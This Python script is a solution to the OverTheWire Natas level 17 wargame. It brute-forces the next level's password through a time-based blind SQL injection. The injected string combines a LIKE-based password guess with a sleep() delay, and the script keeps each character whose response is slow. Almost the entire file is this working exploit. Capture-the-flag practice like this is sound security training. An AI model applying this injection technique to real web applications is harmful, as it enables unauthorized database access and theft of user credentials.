import requests
import re
import string
import time

username = "natas17"
password = "<censored>"
url = "http://%s.natas.labs.overthewire.org/"  % username

session = requests.Session()

response = session.get(url,auth=(username,password))
print(response.text)
print("="*50)

source = "index-source.html"
response = session.get(url+source,auth=(username,password))
print(response.text)
print("="*50)

sPassword = list()
chars = string.ascii_lowercase + string.ascii_uppercase + string.digits

sql_like_injection = 'natas18" AND BINARY password LIKE "'
sleep_cmd = '"AND sleep(10) #"'

# Bruteforcing the password one more time.
print("Just wait for a little....")
while(len(sPassword) != 32):
	for char in chars:
		start_time = time.time()
		response = session.post(url, auth=(username,password), data={'username': sql_like_injection + ''.join(sPassword) + char + '%' + sleep_cmd})
		end_time = time.time()
		dif = end_time - start_time
		if (dif >= 6):
			sPassword.append(char)
			break
		if len(sPassword) == 16:
			print("Almost done...")

print("="*50)
print("\nThe password for the next level is: " + "".join(sPassword))